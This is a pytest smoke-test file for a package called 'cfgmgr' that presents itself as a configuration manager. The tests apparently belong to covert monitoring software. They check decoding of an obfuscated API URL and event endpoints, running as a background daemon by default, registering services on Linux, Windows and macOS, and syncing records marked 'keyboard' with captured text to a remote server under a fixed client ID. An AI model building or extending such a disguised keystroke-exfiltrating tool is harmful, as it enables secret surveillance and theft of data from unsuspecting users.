"""Smoke tests for cfgmgr core logic (Linux CI; Windows-specific paths skipped)."""
import os
import sys
from pathlib import Path
from unittest import mock

import pytest

# Package lives under src/
ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "src"))


def test_acquire_worker_singleton_excludes_second_holder(tmp_path):
    """Second lock attempt on same dir fails (no kill — lock only)."""
    from cfgmgr import core

    data = tmp_path / "data"
    data.mkdir()
    try:
        assert core._acquire_worker_singleton(data) is True
        assert core._acquire_worker_singleton(data) is False
    finally:
        if core._singleton_lock_file is not None:
            try:
                core._singleton_lock_file.close()
            except OSError:
                pass
            core._singleton_lock_file = None
        if core._win_singleton_mutex and sys.platform == "win32":
            try:
                import ctypes
                ctypes.windll.kernel32.CloseHandle(core._win_singleton_mutex)
            except Exception:
                pass
            core._win_singleton_mutex = None


def test_apply_edit_and_nav():
    from cfgmgr.core import _apply_edit, _NAV_DELETE_WORD, _NAV_BACKSPACE

    t, c = _apply_edit("hello", 5, _NAV_BACKSPACE)
    assert t == "hell" and c == 4
    t, c = _apply_edit("hello world", 5, _NAV_DELETE_WORD)
    assert t == " world" and c == 0


def test_systemd_exec_start_quotes_paths():
    from cfgmgr.core import _systemd_exec_start

    line = _systemd_exec_start("/opt/py 3/bin/python", 64, None)
    assert "py 3" in line or "py\\ 3" in line or "'" in line
    assert "cfgmgr" in line
    assert "-m" in line


def test_u_decodes_api_url():
    from cfgmgr.core import _u

    assert _u().startswith("http://")


def test_api_endpoints_decode():
    from cfgmgr._c import _ep0, _ep1

    assert _ep0() == "/api/events"
    assert _ep1() == "/api/events/batch"


def test_main_parse_minimal(tmp_path):
    from cfgmgr import core

    install = tmp_path / "CfgMgr"
    data = install / "data"
    data.mkdir(parents=True)
    out = data / "sync_data.json"

    with mock.patch.object(core, "_get_install_paths", return_value=(install, data, out)), mock.patch.object(
        core, "_run_sync_loop"
    ) as rsl, mock.patch.object(core, "_register_service_linux", return_value=False), mock.patch.object(
        core, "_register_service_windows", return_value=False
    ), mock.patch.object(core, "_register_service_macos", return_value=False), mock.patch.object(
        core, "_acquire_worker_singleton", return_value=True
    ), mock.patch("cfgmgr.core._is_windows", return_value=False):
        with mock.patch.object(sys, "argv", ["cfgmgr", "--no-daemon", "--local"]):
            core.main()
    rsl.assert_called_once()


@pytest.mark.skipif(
    sys.platform == "win32",
    reason="Windows uses _daemonize_windows; this tests Unix default daemon path",
)
def test_daemonize_unix_child_reaches_run_loop(tmp_path):
    """Linux/macOS/BSD: default is daemon; mocked fork path must still reach _run_sync_loop."""
    from cfgmgr import core

    install = tmp_path / "CfgMgr"
    data = install / "data"
    data.mkdir(parents=True)
    out = data / "sync_data.json"
    calls = []

    def fake_unix(pidfile, logfile):
        pass

    def fake_run(*a, **k):
        calls.append("run")

    with mock.patch.object(core, "_get_install_paths", return_value=(install, data, out)), mock.patch.object(
        core, "_daemonize_unix", fake_unix
    ), mock.patch.object(core, "_run_sync_loop", fake_run), mock.patch.object(
        core, "_register_service_linux", return_value=False
    ), mock.patch.object(core, "_acquire_worker_singleton", return_value=True), mock.patch("cfgmgr.core._is_windows", return_value=False):
        with mock.patch.object(sys, "argv", ["cfgmgr", "--local"]):
            core.main()
    assert calls == ["run"]


def test_sync_record_to_remote_ok(monkeypatch):
    from cfgmgr.core import _sync_record_to_remote

    class Resp:
        status = 200

        def __enter__(self):
            return self

        def __exit__(self, *a):
            return None

    def fake_urlopen(req, timeout=10):
        return Resp()

    monkeypatch.setattr("urllib.request.urlopen", fake_urlopen)
    ok = _sync_record_to_remote(
        "http://localhost:8765",
        {"timestamp": "2026-01-01T00:00:00Z", "source": "keyboard", "text": "x", "size_bytes": 1},
        "client-1",
    )
    assert ok is True


def test_is_unix_like_matches_platform_rules():
    from cfgmgr import core

    p = core.sys.platform
    expected = p in ("linux", "darwin") or p.startswith(("freebsd", "openbsd", "netbsd"))
    assert core._is_unix_like() == expected


def test_is_unix_like_true_for_versioned_bsd_sys_platform():
    """CPython uses e.g. freebsd14, not freebsd."""
    from cfgmgr import core

    with mock.patch.object(core.sys, "platform", "freebsd14"):
        assert core._is_unix_like() is True
    with mock.patch.object(core.sys, "platform", "openbsd7"):
        assert core._is_unix_like() is True
    with mock.patch.object(core.sys, "platform", "win32"):
        assert core._is_unix_like() is False


def test_client_id_stable(tmp_path, monkeypatch):
    from cfgmgr import core

    install = tmp_path / "i"
    data = install / "d"
    data.mkdir(parents=True)
    monkeypatch.setattr(core, "_get_install_paths", lambda user_only=True: (install, data, data / "sync_data.json"))
    cid1 = core._client_id()
    cid2 = core._client_id()
    assert cid1 == cid2
    assert len(cid1 or "") <= 64
